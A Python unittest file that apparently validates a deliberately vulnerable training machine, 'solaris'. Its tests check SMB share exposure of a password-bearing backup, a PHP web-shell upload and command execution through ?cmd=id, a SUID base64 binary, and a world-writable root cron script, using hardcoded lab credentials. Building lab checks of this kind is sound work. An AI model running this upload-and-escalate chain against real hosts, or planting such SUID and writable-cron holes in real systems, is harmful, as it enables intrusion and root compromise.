import unittest
from libraries.smb_share_tests import test_smb_share_exists, test_smb_file_access
from libraries.http_tests import check_http_payload_200
from libraries.cmd_tests import test_cmd_execution_over_ssh
from custom.solaris import solaris_smb_initial_access



class TestSolaris(unittest.TestCase):
    solaris_target_ip = "10.100.7.40"

    # solaris test initial access via SMB
    def test_0_solaris_public_share_access(self): # check if share is accessible
        result = test_smb_share_exists(target_ip=self.solaris_target_ip, share_name="public")
        self.assertTrue(result.success, msg=result.message)

    def test_0_solaris_smb_file_access(self): # check if file is accessible
        result = test_smb_file_access(target_ip=self.solaris_target_ip, share_name="public", file="backup.zip", path="/")
        self.assertTrue(result.success, msg=result.message)

    def test_0_solaris_initial_access_via_smb(self): # check if file has solaris user password
        result = solaris_smb_initial_access(self.solaris_target_ip)
        self.assertTrue(result.success, msg=result.message)

    # solaris test initial access via HTTP (arbitrary file upload)
    def test_1_solaris_arbitrary_upload(self): # testing upload component
        result = check_http_payload_200(
            target_ip=self.solaris_target_ip, 
            url_path="/upload.php", 
            form_data={"submit": "Upload"}, 
            verb="POST", 
            files={"fileToUpload": "custom/assets/shell.php"}
        )
        self.assertTrue(result.success, msg=result.message)

    def test_2_solaris_rce_via_arbitrary_upload(self): # testing RCE component
        result = check_http_payload_200(
            target_ip=self.solaris_target_ip, 
            url_path="/uploads/shell.php?cmd=id",
        )

        self.assertTrue(result.success, msg=f"Shell not accessible: {result.message}")
        self.assertIn("uid=", result.data or "", msg="RCE failed - no command output")

    # test to see if base64 executable has the SUID bit set
    def test_3_solaris_suid_base64(self):
        result = test_cmd_execution_over_ssh(
            target_ip=self.solaris_target_ip,
            username="solaris",
            password="solar-paneL321",
            command="stat -c '%a %n' /usr/bin/base64",
            expected_output="4755"
        )

        self.assertTrue(result.success, msg=result.message)

    # test to see if cronjob exists
    def test_4_solaris_cronjob_exists(self):
        result = test_cmd_execution_over_ssh(
            target_ip=self.solaris_target_ip,
            username="root",
            password="Ag9G61RF",
            command="cat /etc/cron.d/solaris-report",
            expected_output="*/5 * * * * root /usr/local/bin/solaris-report.sh"
        )

        self.assertTrue(result.success, msg=result.message)

    # test to see if cronjob script exists with expected content
    def test_4_solaris_cronjob_script_exists(self):
        result = test_cmd_execution_over_ssh(
            target_ip=self.solaris_target_ip,
            username="root",
            password="Ag9G61RF",
            command="cat /usr/local/bin/solaris-report.sh",
            expected_output="tail -n 10 /var/log/auth.log | base64 >> /var/log/auth-store.log"
        )

        self.assertTrue(result.success, msg=result.message)

    # test to see if the auth-store.log file is being populated
    def test_4_solaris_auth_store_log_populated(self):
        result = test_cmd_execution_over_ssh(
            target_ip=self.solaris_target_ip,
            username="root",
            password="Ag9G61RF",
            command="stat -c '%s' /var/log/auth-store.log",
            expected_output="0"
        )
        print(result)
        self.assertFalse(result.success, msg="auth-store.log file is empty, cronjob may not be working")
    
    # test to see if the script is writable by others
    def test_4_solaris_cronjob_script_writable(self):
        result = test_cmd_execution_over_ssh(
            target_ip=self.solaris_target_ip,
            username="solaris",
            password="solar-paneL321",
            command="stat -c '%a %n' /usr/local/bin/solaris-report.sh",
            expected_output="777"
        )

        self.assertTrue(result.success, msg=result.message)

if __name__ == "__main__":
    unittest.main()